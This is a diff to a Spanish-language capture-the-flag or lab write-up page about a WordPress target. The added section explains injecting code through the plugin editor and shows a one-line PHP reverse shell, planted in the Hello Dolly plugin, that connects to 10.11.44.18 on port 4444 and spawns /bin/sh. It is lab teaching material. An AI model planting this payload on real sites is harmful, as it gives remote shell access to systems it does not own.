@@ -238,10 +238,14 @@ realizar un ataque de fuerza bruta haciendo que vaya descartando nombres de usua
 <br><h3 class="post-title">Reverse Shell en PHP</h3><br>
 
 <p class="plain-text">Después de hacer un barrido general por el menú de Wordpress, lo que más llama la atención es que tenemos accesso al editor de código con el que podríamos inyectar código a la web para vulnerarla.
-Al tener accesso a todos los plugins podemos intentar spawnear una <code class="language-plaintext highlighter-rouge">reverse shell </code>a través de la inyección de código malicioso en un plugin que use php.
+Al tener accesso a todos los plugins podemos intentar spawnear una <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de la inyección de código malicioso en un plugin que use php.
 </p>
 
-
+<p class="plain-text">En este caso el elegido ha sido el plugin <code class="language-plaintext highlighter-rouge">Hello Dolly</code> al cual tenemos acceso y funciona con php. Iremos al editor y borraremos su código original dejándolo
+de la siguiente forma: </p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az"><?php $sock=fsockopen("10.11.44.18",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?></span>
+</code></pre></div></div><br>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">/* WARNING: Removing unreachable block (ram,0x311716c5) */
 
